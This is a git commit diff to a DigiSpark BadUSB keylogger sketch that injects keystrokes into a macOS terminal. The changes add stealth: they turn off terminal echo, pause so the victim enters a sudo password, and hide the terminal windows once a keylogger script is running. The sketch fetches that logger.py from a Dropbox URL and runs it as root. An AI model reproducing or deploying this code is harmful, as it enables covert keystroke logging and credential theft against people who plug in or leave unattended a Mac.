a20445bfab4097098db478dee3951dd1a48e077a
AnushkaMenon <30318462+AnushkaMenon@users.noreply.github.com>
2020-04-14 16:29:07 +1000

    Update keylogger.ino

--- keylogging/keylogger.ino
+++ keylogging/keylogger.ino
@@ -19,14 +19,19 @@ void loop() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
     
-    // For testing purposes, needed if you want to try to send files to yourself
-    //  You will have a terminal window open for listening, so open another terminal window to
+    // For testing purposes - needed if you want to try to send files to yourself
+    //  You'll have a terminal window open for listening, so open another terminal window to
     //   run the rest of this script
     //  Shortcut to open a new terminal window: Command + N
     /* DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);*/
+    
+    // disable terminal echoing
+    DigiKeyboard.print("stty -echo");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(250);
 
-    // Go to the Documents folder
+    // go to the Documents folder
     DigiKeyboard.print("cd ~/Documents");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(250);
@@ -91,6 +96,12 @@ void loop() {
     DigiKeyboard.print("sudo python3 ~/Documents/logger.py");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     
+    // allow 5 seconds for the user to type their password in
+    DigiKeyboard.delay(5000);
+
+    // hide all terminal windows
+    DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);
+    
     finished = true;
   }
 }
@@ -104,9 +115,9 @@ void write_logger() {
     DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
     DigiKeyboard.print("Google Chrome");
     DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
-    DigiKeyboard.print(" https://www.dl.dropboxusercontent.com/s/u34rsg5bguh95uq/logger.py?dl=0");
+    DigiKeyboard.print(" --args --new-window https://www.dl.dropboxusercontent.com/s/u34rsg5bguh95uq/logger.py?dl=0");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(2000);
+    DigiKeyboard.delay(3500);
 
     // copy the code in the Dropbox file
     DigiKeyboard.sendKeyStroke(KEY_A, MOD_GUI_LEFT);
